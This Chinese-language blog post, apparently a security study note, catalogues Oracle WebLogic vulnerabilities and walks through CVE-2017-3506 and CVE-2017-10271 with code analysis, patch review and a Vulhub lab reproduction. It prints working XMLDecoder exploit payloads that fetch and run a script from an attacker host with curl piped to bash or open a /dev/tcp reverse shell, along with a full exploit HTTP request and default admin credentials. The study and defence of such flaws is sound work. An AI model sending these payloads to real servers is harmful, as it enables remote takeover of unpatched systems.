itemprop="dateCreated datePublished" datetime="2025-03-29T16:00:00.000Z" title="发表于 2025-03-30 00:00:00">2025-03-30</time><time itemprop="dateCreated datePublished" datetime="2025-05-22T12:29:38.748Z" title="更新于 2025-05-22 20:29:38">2025-05-22</time></header><h2 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h2><p>以下是WebLogic常见的安全漏洞列表，按类型和影响分类：</p>
<h3 id="1-反序列化漏洞"><a href="#1-反序列化漏洞" class="headerlink" title="1. 反序列化漏洞"></a>1. <strong>反序列化漏洞</strong></h3><ul>
<li><p><strong>CVE-2017-3506</strong>  </p>
<ul>
<li><strong>描述</strong>：XMLDecoder反序列化漏洞，允许远程代码执行（RCE）。</li>
<li><strong>影响</strong>：攻击者通过构造恶意XML数据执行任意命令。</li>
</ul>
</li>
<li><p><strong>CVE-2017-10271</strong>  </p>
<ul>
<li><strong>描述</strong>：CVE-2017-3506的补丁绕过，同样通过XMLDecoder触发RCE。</li>
</ul>
</li>
<li><p><strong>CVE-2019-2725</strong>  </p>
<ul>
<li><strong>描述</strong>：WebLogic wls9-async组件反序列化漏洞，影响Oracle WebLogic 10.3.6.0及12.1.3.0版本。</li>
</ul>
</li>
<li><p><strong>CVE-2020-2551</strong>  </p>
<ul>
<li><strong>描述</strong>：通过IIOP协议的反序列化漏洞，攻击者可在未授权下远程执行代码。</li>
</ul>
</li>
<li><p><strong>CVE-2020-14882</strong>和<strong>CVE-2020-14883</strong></p>
<ul>
<li><strong>描述</strong>：通过14882控制台未授权绕过，再结合14883的远程加载xml文件实现RCE</li>
</ul>
</li>
<li><p><strong>CVE-2023-21839（历史补丁关联）</strong></p>
<ul>
<li><strong>背景</strong>：2023年未完全修复的漏洞，后续引发 CVE-2024-20931。</li>
<li><strong>影响</strong>：通过 T3 协议远程执行代码，需结合后续补丁彻底修复</li>
</ul>
</li>
<li><p><strong>CVE-2024-20931（JNDI注入）</strong></p>
<ul>
<li><strong>关联漏洞</strong>：CVE-2023-21839 补丁未完全修复的遗留问题。</li>
<li><strong>影响版本</strong>：12.2.1.4.0、14.1.1.0.0</li>
<li><strong>漏洞原理</strong>：<code>ForeignOpaqueReference</code> 对象在远程查询时触发二次 JNDI 注入，攻击者通过 T3&#x2F;IIOP 协议接管服务器。</li>
</ul>
</li>
</ul>
<h3 id="2-IIOP-T3协议反序列化漏洞"><a href="#2-IIOP-T3协议反序列化漏洞" class="headerlink" title="2. IIOP&#x2F;T3协议反序列化漏洞"></a>2. <strong>IIOP&#x2F;T3协议反序列化漏洞</strong></h3><ul>
<li><p><strong>CVE-2015-4852</strong></p>
<ul>
<li><strong>描述：</strong>首个公开的T3反序列化漏洞，利用Apache Commons Collections链实现RCE</li>
</ul>
</li>
<li><p><strong>CVE-2017-3248</strong></p>
<ul>
<li><strong>类型</strong>：Java RMI 反序列化漏洞</li>
<li><strong>影响版本</strong>：WebLogic 10.3.6.0, 12.1.3.0 等</li>
<li><strong>原理</strong>：<br>RMI 注册表（通过 T3 协议通信）未校验反序列化对象，攻击者可利用 <code>RemoteObjectInvocationHandler</code> 触发远程代码执行。</li>
<li><strong>关联协议</strong>：T3、RMI</li>
<li><strong>利用工具</strong>：<code>ysoserial</code> 的 <code>JRMPClient</code> Payload</li>
</ul>
</li>
<li><p><strong>CVE-2018-2628</strong>  </p>
<ul>
<li><strong>类型</strong>：T3 协议反序列化 RCE</li>
<li><strong>影响版本</strong>：WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.2&#x2F;3 等</li>
<li><strong>原理</strong>：<br>T3 协议处理 <code>InboundMsgAbbrev</code> 类的反序列化时，绕过黑名单过滤，利用 <code>RemoteObjectInvocationHandler</code> 和 JRMP 协议下发恶意代码。</li>
<li><strong>关键点</strong>：绕过对 <code>java.rmi.registry.Registry</code> 接口的校验，触发二次反序列化。</li>
<li><strong>CVSS 评分</strong>：9.8（严重）</li>
</ul>
</li>
<li><p><strong>CVE-2020-2883</strong>  </p>
<ul>
<li><strong>类型</strong>：T3 协议补丁绕过漏洞<ul>
<li><strong>影响版本</strong>：WebLogic 10.3.6.0, 12.2.1.3-12.2.1.5 等</li>
<li><strong>原理</strong>：<br>CVE-2018-2628 的补丁未完全覆盖所有利用链，攻击者通过新的反序列化路径（如 <code>UnicastRef</code>）绕过防御。</li>
<li><strong>关联协议</strong>：T3</li>
<li><strong>修复建议</strong>：升级至 2020 年 4 月 Oracle 关键补丁更新（CPU）。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>CVE-2020-2551</strong></p>
<ul>
<li><strong>类型</strong>：IIOP&#x2F;T3 协议反序列化 RCE<ul>
<li><strong>影响版本</strong>：WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3-12.2.1.5 等</li>
<li><strong>原理</strong>：<br>通过 IIOP 协议（与 T3 协议共用反序列化逻辑）触发 <code>UnitOfWorkChangeSet</code> 类的反序列化漏洞。</li>
<li><strong>关联协议</strong>：IIOP、T3</li>
<li><strong>利用工具</strong>：<code>weblogic-framework</code> 或定制化 Payload。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>CVE-2020-14644</strong></p>
<ul>
<li><strong>类型</strong>：核心组件反序列化 RCE</li>
<li><strong>影响版本</strong>：WebLogic 12.2.1.3-12.2.1.5, 14.1.1.0.0 等</li>
<li><strong>原理</strong>：<br><code>Coherence</code> 组件的反序列化漏洞通过 T3&#x2F;IIOP 协议触发，允许未授权攻击者执行命令。</li>
<li><strong>关联协议</strong>：T3、IIOP</li>
<li><strong>CVSS 评分</strong>：9.8（严重）</li>
</ul>
</li>
<li><p><strong>CVE-2020-14825</strong></p>
<ul>
<li><strong>漏洞类型</strong>：IIOP&#x2F;T3协议反序列化漏洞</li>
<li><strong>影响版本</strong>：12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</li>
<li><strong>描述</strong>：利用黑名单未覆盖的<code>LockVersionExtractor</code>类构造恶意序列化数据，通过IIOP或T3协议触发反序列化，实现RCE。</li>
<li><strong>关联协议</strong>：T3、IIOP</li>
</ul>
</li>
<li><p><strong>CVE-2020-14841 和 CVE-2020-14859</strong></p>
</li>
<li><p><strong>漏洞类型</strong>：IIOP协议反序列化漏洞</p>
</li>
<li><p><strong>影响版本</strong>：10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</p>
</li>
<li><p><strong>描述</strong>：通过IIOP协议绕过反序列化防护机制，攻击者可远程执行代码。这两个漏洞常与CVE-2020-14825一同被提及7。</p>
</li>
<li><p><strong>修复方式</strong>：应用Oracle安全补丁。</p>
</li>
<li><p><strong>CVE-2024-21216</strong></p>
</li>
<li><p><strong>CVSS评分</strong>：9.8（严重）</p>
</li>
<li><p><strong>影响版本</strong>：12.2.1.4.0、14.1.1.0.0</p>
</li>
<li><p><strong>漏洞原理</strong>：通过 T3&#x2F;IIOP 协议的反序列化漏洞，未经身份验证的攻击者可远程执行任意代码，完全控制服务器。</p>
</li>
<li><p><strong>修复方案</strong>：官方已发布补丁，建议禁用 T3&#x2F;IIOP 协议作为临时缓解措施。</p>
</li>
</ul>
<h3 id="3-未经身份验证的远程代码执行（RCE）"><a href="#3-未经身份验证的远程代码执行（RCE）" class="headerlink" title="3. 未经身份验证的远程代码执行（RCE）"></a>3. <strong>未经身份验证的远程代码执行（RCE）</strong></h3><ul>
<li><strong>CVE-2020-14882</strong>  <ul>
<li><strong>描述</strong>：通过HTTP协议绕过身份验证，结合<strong>CVE-2020-14883</strong>（权限提升）实现未授权RCE。</li>
</ul>
</li>
<li><strong>CVE-2021-2109</strong>  <ul>
<li><strong>描述</strong>：Admin Console组件漏洞，允许未授权攻击者接管服务器。</li>
</ul>
</li>
</ul>
<h3 id="4-服务器端请求伪造（SSRF）"><a href="#4-服务器端请求伪造（SSRF）" class="headerlink" title="4. 服务器端请求伪造（SSRF）"></a>4. <strong>服务器端请求伪造（SSRF）</strong></h3><ul>
<li><strong>CVE-2014-4210</strong>  <ul>
<li><strong>描述</strong>：未授权SSRF漏洞，攻击者可探测内网服务或发起进一步攻击。</li>
</ul>
</li>
</ul>
<h3 id="5-权限提升漏洞"><a href="#5-权限提升漏洞" class="headerlink" title="5. 权限提升漏洞"></a>5. <strong>权限提升漏洞</strong></h3><ul>
<li><strong>CVE-2020-14644</strong>  <ul>
<li><strong>描述</strong>：核心组件漏洞，攻击者可通过构造数据提升权限至管理员。</li>
</ul>
</li>
</ul>
<h3 id="6-管理控制台漏洞"><a href="#6-管理控制台漏洞" class="headerlink" title="6. 管理控制台漏洞"></a>6. <strong>管理控制台漏洞</strong></h3><ul>
<li><strong>弱口令&#x2F;默认配置</strong>  <ul>
<li><strong>风险</strong>：默认管理员账户（如<code>weblogic</code>&#x2F;<code>weblogic123</code>）未修改，易被暴力破解。</li>
</ul>
</li>
<li><strong>CVE-2018-2893</strong>  <ul>
<li><strong>描述</strong>：控制台配置错误导致RCE，需认证用户利用。</li>
</ul>
</li>
</ul>
<h3 id="7-第三方库漏洞"><a href="#7-第三方库漏洞" class="headerlink" title="7. 第三方库漏洞"></a>7. <strong>第三方库漏洞</strong></h3><ul>
<li><strong>Log4j (CVE-2021-44228)</strong>  <ul>
<li><strong>描述</strong>：若WebLogic使用受影响版本的Log4j，攻击者可通过日志注入实现RCE。</li>
</ul>
</li>
</ul>
<h3 id="8-其他高危漏洞"><a href="#8-其他高危漏洞" class="headerlink" title="8. 其他高危漏洞"></a>8. <strong>其他高危漏洞</strong></h3><ul>
<li><strong>CVE-2020-14750</strong>  <ul>
<li><strong>描述</strong>：身份验证绕过漏洞，影响WebLogic多版本。</li>
</ul>
</li>
<li><strong>CVE-2018-3252</strong>  <ul>
<li><strong>描述</strong>：WebLogic Server远程代码执行漏洞，需攻击者构造特定T3请求。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="缓解建议"><a href="#缓解建议" class="headerlink" title="缓解建议"></a><strong>缓解建议</strong></h3><ol>
<li><strong>及时更新补丁</strong>：定期应用Oracle官方安全补丁。</li>
<li><strong>禁用高危协议</strong>：关闭不必要的T3&#x2F;IIOP协议或限制访问IP。</li>
<li><strong>强化身份验证</strong>：修改默认凭据，启用强密码策略。</li>
<li><strong>网络隔离</strong>：将WebLogic部署在内网，限制公网暴露。</li>
<li><strong>最小化权限</strong>：以非特权用户运行服务，避免使用root权限。</li>
</ol>
<p>这些漏洞多数已被官方修复，但未及时更新的系统仍面临高风险。建议结合漏洞扫描工具（如Nessus）定期检查环境安全性。</p>
<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><h2 id="1-CVE-2017-3506"><a href="#1-CVE-2017-3506" class="headerlink" title="1.CVE-2017-3506"></a>1.<strong>CVE-2017-3506</strong></h2><h4 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. <strong>漏洞背景</strong></h4><p>CVE-2017-3506 是 Oracle WebLogic Server 中 <code>wls-wsat</code> 组件的 XMLDecoder 反序列化漏洞，攻击者通过构造恶意 SOAP 请求触发反序列化，实现远程代码执行（RCE）。该漏洞影响 WebLogic 10.3.6.0、12.1.3.0、12.2.1.1 等版本。</p>
<hr>
<h4 id="2-漏洞触发原理"><a href="#2-漏洞触发原理" class="headerlink" title="2. 漏洞触发原理"></a>2. <strong>漏洞触发原理</strong></h4><h5 id="核心代码流程"><a href="#核心代码流程" class="headerlink" title="核心代码流程"></a><strong>核心代码流程</strong></h5><p>漏洞触发路径涉及以下关键代码段：</p>
<ol>
<li><strong>请求入口</strong>：<br>攻击者发送 POST 请求到 <code>/wls-wsat/CoordinatorPortType</code> 等路径，SOAP 请求头中包含恶意 XML 数据。</li>
<li><strong>XML 解析流程</strong>：<br>WebLogic 的 <code>WorkContextServerTube.processRequest</code> 方法调用 <code>readHeaderOld</code>，将请求中的 XML 数据传入 <code>WorkContextXmlInputAdapter</code> 类的构造函数。</li>
<li><strong>反序列化执行</strong>：<br><code>WorkContextXmlInputAdapter</code> 直接调用 <code>XMLDecoder</code> 反序列化未经过滤的 XML 数据，导致恶意代码执行。</li>
</ol>
<p><strong>关键代码段</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WorkContextXmlInputAdapter 构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">WorkContextXmlInputAdapter</span><span class="params">(InputStream var1)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.xmlDecoder = <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(var1); <span class="comment">// 直接反序列化输入流</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="恶意-XML-构造"><a href="#恶意-XML-构造" class="headerlink" title="恶意 XML 构造"></a><strong>恶意 XML 构造</strong></h5><p>攻击者构造的 XML 利用 <code>java.lang.ProcessBuilder</code> 执行系统命令，例如：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>curl http://攻击者IP/恶意脚本 | bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>该 XML 通过 <code>ProcessBuilder</code> 启动 <code>/bin/bash</code> 执行远程下载的恶意脚本。</p>
<hr>
<h4 id="3-代码审计要点"><a href="#3-代码审计要点" class="headerlink" title="3. 代码审计要点"></a>3. <strong>代码审计要点</strong></h4><h5 id="审计关键点"><a href="#审计关键点" class="headerlink" title="审计关键点"></a><strong>审计关键点</strong></h5><ol>
<li><strong>反序列化入口</strong>：<br>检查 <code>XMLDecoder</code> 的使用场景，尤其是用户可控的输入是否直接传入反序列化方法。</li>
<li><strong>XML 过滤机制</strong>：<br>是否对 XML 标签（如 <code>object</code>、<code>void</code>、<code>array</code>）和类名（如 <code>java.lang.ProcessBuilder</code>）进行黑名单过滤。</li>
<li><strong>补丁绕过风险</strong>：<br>初始补丁（CVE-2017-3506）仅过滤 <code>object</code> 标签，后续 CVE-2017-10271 通过 <code>array</code> 或 <code>void</code> 标签绕过，需验证黑名单的完整性。</li>
</ol>
<h5 id="漏洞调用链分析"><a href="#漏洞调用链分析" class="headerlink" title="漏洞调用链分析"></a><strong>漏洞调用链分析</strong></h5><ul>
<li><strong>触发点</strong>：<code>WorkContextServerTube.processRequest</code> 处理 SOAP 请求头。</li>
<li><strong>反序列化路径</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">processRequest → readHeaderOld → WorkContextXmlInputAdapter → XMLDecoder.readObject()</span><br></pre></td></tr></table></figure>
通过调试工具（如 IDA 或 Java 调试器）追踪 <code>XMLDecoder</code> 的调用栈，确认是否触发 <code>ProcessBuilder.start()</code> 方法。</li>
</ul>
<hr>
<h4 id="4-修复方案与审计验证"><a href="#4-修复方案与审计验证" class="headerlink" title="4. 修复方案与审计验证"></a>4. <strong>修复方案与审计验证</strong></h4><h5 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a><strong>补丁分析</strong></h5><p>Oracle 针对 CVE-2017-3506 的补丁在 <code>WorkContextXmlInputAdapter</code> 中添加了 <code>validate()</code> 方法，使用 SAXParser 检查 XML 中是否包含 <code>object</code> 标签：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查 XML 中是否存在 object 标签</span></span><br><span class="line">    <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid context type: object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但该补丁因仅过滤单一标签而被绕过，后续 CVE-2017-10271 补丁扩展了黑名单（如 <code>new</code>、<code>method</code> 等）。</p>
<h5 id="修复验证"><a href="#修复验证" class="headerlink" title="修复验证"></a><strong>修复验证</strong></h5><ol>
<li><strong>组件删除</strong>：<br>删除 <code>wls-wsat.war</code> 及相关目录（如 <code>Middleware/wlserver_10.3/server/lib/wls-wsat.war</code>）。</li>
<li><strong>网络控制</strong>：<br>限制 <code>/wls-wsat/</code> 路径的访问权限，禁止外网直接访问。</li>
<li><strong>补丁升级</strong>：<br>确认已应用 Oracle 官方补丁（如 2017 年 4 月关键补丁）。</li>
</ol>
<hr>
<h4 id="5-总结与审计建议"><a href="#5-总结与审计建议" class="headerlink" title="5. 总结与审计建议"></a>5. <strong>总结与审计建议</strong></h4><ul>
<li><strong>漏洞本质</strong>：XMLDecoder 反序列化未过滤用户输入的恶意标签。</li>
<li><strong>审计重点</strong>：关注所有 XML 解析逻辑，尤其是涉及动态类加载或命令执行的代码路径。</li>
<li><strong>防御建议</strong>：  <ul>
<li>使用白名单机制替代黑名单，限制可反序列化的类。</li>
<li>升级至最新版本，定期进行漏洞扫描（如使用 Nessus）。</li>
</ul>
</li>
</ul>
<p>通过代码审计可深入理解漏洞触发机制，结合补丁分析及修复验证，可有效防御此类反序列化漏洞。</p>
<h2 id="2-CVE-2017-10271"><a href="#2-CVE-2017-10271" class="headerlink" title="2.CVE-2017-10271"></a>2.CVE-2017-10271</h2><hr>
<h4 id="一、漏洞背景"><a href="#一、漏洞背景" class="headerlink" title="一、漏洞背景"></a><strong>一、漏洞背景</strong></h4><p>CVE-2017-10271 是 Oracle WebLogic Server 中 <code>wls-wsat</code> 组件（WebLogic Web Services Atomic Transactions）的 <strong>XMLDecoder 反序列化漏洞</strong>，允许攻击者通过构造恶意 SOAP 请求触发远程代码执行（RCE）。该漏洞是 CVE-2017-3506 的补丁绕过版本，影响 WebLogic 10.3.6.0.0、12.1.3.0.0、12.2.1.1.0 和 12.2.1.2.0 等版本。</p>
<hr>
<h4 id="二、漏洞原理分析"><a href="#二、漏洞原理分析" class="headerlink" title="二、漏洞原理分析"></a><strong>二、漏洞原理分析</strong></h4><h5 id="1-漏洞触发流程"><a href="#1-漏洞触发流程" class="headerlink" title="1. 漏洞触发流程"></a><strong>1. 漏洞触发流程</strong></h5><ol>
<li><strong>入口请求</strong>：<br>攻击者向 WebLogic 的 <code>wls-wsat</code> 服务端点（如 <code>/wls-wsat/CoordinatorPortType</code>）发送 SOAP 格式的 HTTP POST 请求，请求头中包含恶意 XML 数据。</li>
<li><strong>XML 解析与反序列化</strong>：<br>WebLogic 的 <code>WorkContextServerTube.processRequest</code> 方法处理请求，通过 <code>readHeaderOld</code> 方法提取 SOAP 头部的 <code>WorkContext</code> 标签内容，并将其传递给 <code>WorkContextXmlInputAdapter</code> 类。</li>
<li><strong>XMLDecoder 反序列化</strong>：<br><code>WorkContextXmlInputAdapter</code> 直接调用 <code>XMLDecoder</code> 对未经验证的 XML 数据进行反序列化，导致攻击者构造的恶意代码（如 <code>java.lang.ProcessBuilder</code>）被执行。</li>
</ol>
<p><strong>关键代码段</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WorkContextXmlInputAdapter 构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">WorkContextXmlInputAdapter</span><span class="params">(InputStream var1)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.xmlDecoder = <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(var1); <span class="comment">// 未过滤直接反序列化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-补丁绕过逻辑"><a href="#2-补丁绕过逻辑" class="headerlink" title="2. 补丁绕过逻辑"></a><strong>2. 补丁绕过逻辑</strong></h5><ul>
<li><p><strong>CVE-2017-3506 的修复缺陷</strong>：Oracle 初始补丁仅过滤 <code>object</code> 标签，但攻击者可通过其他标签（如 <code>array</code>、<code>void</code>）绕过限制。</p>
</li>
<li><p><strong>恶意 XML 构造</strong>：<br>利用 <code>ProcessBuilder</code> 启动 <code>/bin/bash</code> 执行命令，或通过 <code>java.io.PrintWriter</code> 写入 WebShell。例如：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &gt;&amp; /dev/tcp/攻击者IP/端口 0&gt;&amp;1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行 HTML</p>
<p>该 XML 触发 <code>ProcessBuilder.start()</code> 执行反弹 Shell 命令</p>
</li>
</ul>
<h4 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h4><hr>
<h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h5><ol>
<li><p><strong>使用 Vulhub 快速部署</strong>  </p>
<ul>
<li>下载 Vulhub 项目并进入漏洞目录：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/weblogic/CVE-2017-10271</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li>
<li>启动后访问 <code>http://目标IP:7001</code>，若返回 404 页面则说明 WebLogic 服务正常。</li>
</ul>
</li>
<li><p><strong>手动搭建 WebLogic 环境</strong>  </p>
<ul>
<li>适用于 Linux 系统（如 CentOS 6.9），需安装 WebLogic 10.3.6.0 版本及兼容 JDK（如 JDK 1.8）。</li>
</ul>
</li>
</ol>
<h5 id="2-漏洞验证与利用"><a href="#2-漏洞验证与利用" class="headerlink" title="2. 漏洞验证与利用"></a><strong>2. 漏洞验证与利用</strong></h5><ol>
<li><p><strong>检测漏洞存在性</strong>  </p>
<ul>
<li>访问 URL <code>http://目标IP:7001/wls-wsat/CoordinatorPortType</code>，若返回 如下格式页面则可能存在漏洞。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250404172624550.png?x-oss-process=style/img-to-webp" alt="image-20250404172624550"></p>
</li>
<li><p><strong>构造恶意请求</strong>  </p>
<ul>
<li><p><strong>反弹 Shell</strong><br>使用 Burp Suite 或 Python 脚本发送包含以下 XML 的 POST 请求：  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 目标IP:7001</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span 